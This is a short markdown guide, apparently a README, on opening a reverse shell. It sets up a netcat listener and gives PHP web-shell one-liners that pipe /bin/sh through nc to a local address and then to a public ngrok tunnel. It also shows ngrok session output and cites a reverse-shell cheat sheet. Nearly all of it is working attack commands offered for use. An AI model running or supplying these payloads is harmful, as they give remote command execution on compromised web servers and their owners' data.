# REVERSE SHELL COMMAND

## reverse shell in localhost

run netcat in termnal
```
nc -lvnp 5555
```

find your ip
```
ipp addr
```
it will show
<br>
<br>

php code

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.5.5 5555 >/tmp/f'); ?>
```
<br>
<br>
<br>

## reverse shell using ngrok

run netcat in termnal
```
nc -lvnp 5555
```

forward the port using ngrok
```
ngrok tcp 5555
```
it will show
<br>
<br>
ngrok<br>
Session Status&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;online<br>
Account&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BISWAJIT DEBNATH (Plan: Free)                        
Version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.10.0                                                                                       
Region&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;India (in)                                                                                    
Latency&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;74ms            
Web Interface&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://127.0.0.1:4040     
Forwarding&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp://0.tcp.in.ngrok.io:17188 -> localhost:5555
<br>
<br>

php code

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.in.ngrok.io 17188 >/tmp/f'); ?>
```

<BR>
<BR>
<BR>

NOTE: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet